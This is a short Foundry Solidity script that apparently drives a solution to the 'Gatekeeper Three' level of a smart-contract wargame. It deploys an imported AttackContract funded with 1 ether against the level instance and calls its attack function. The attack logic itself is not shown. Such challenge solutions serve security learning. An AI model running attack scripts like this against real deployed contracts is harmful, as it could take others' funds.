// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level28.sol";

// ================================================================
// │                   LEVEL 28 - GATEKEEPER THREE                │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        AttackContract attackContract = new AttackContract{value: 1 ether}(targetContractAddress);
        attackContract.attack();
        vm.stopBroadcast();
    }
}
